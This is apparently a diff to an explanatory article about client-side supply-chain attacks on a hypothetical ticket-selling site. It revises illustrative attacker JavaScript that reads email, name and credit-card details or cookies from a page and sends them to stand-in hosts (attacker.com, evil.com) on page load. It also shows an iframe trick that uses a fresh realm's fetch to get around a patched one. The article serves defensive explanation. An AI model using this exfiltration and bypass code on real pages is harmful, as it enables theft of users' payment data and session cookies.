@@ -89,11 +89,19 @@ As a platform selling concert tickets, that risk is pretty big given that as par
 Meaning, if an attacker manages to place their code within one of the files my app serves to clients, they will likely focus on those details, attempting to steal and leak them to their server:
 
 ```javascript
+// malicious code by attacker - steal sensitive info 
+// from page and leak it to a remote server
+
+function leakPII(server, path, info) {
+  fetch(`https://${server}/${path}/?info=` + info);
+}
+
 function stealPII() {
   const {email, name, creditCard} = extractSensitiveInformationFromDOM(document);
   const info = JSON.stringify({email, name, creditCard});
-  fetch('https://attacker.com/stolen-info-from-ticket-king/?info=' + info);
+  leakPII('attacker.com', 'stolen-info-from-ticket-king', info);
 }
+
 document.body.onload = stealPII;
 ```
 
@@ -130,13 +138,14 @@ If only it was that simple:
 // malicious code by attacker - easily escape protection by using a
 // fresh fetch API instance from a new same origin realm
 
-const url = `https://evil.com/stealPII?cookie=` + document.cookie;
-try {
-  fetch(url);
-} catch (err) {
-  const ifr = document.createElement('iframe');
-  const realm = document.body.appendChild(ifr).contentWindow;
-  realm.fetch(url); // bypass is successful
+function leakPII(server, path, info) {
+  try {
+    fetch(`https://${server}/${path}/?info=` + info);
+  } catch (err) {
+    const ifr = document.createElement('iframe');
+    const realm = document.body.appendChild(ifr).contentWindow;
+    realm.fetch(`https://${server}/${path}/?info=` + info); // bypass is successful
+  }
 }
 ```
 
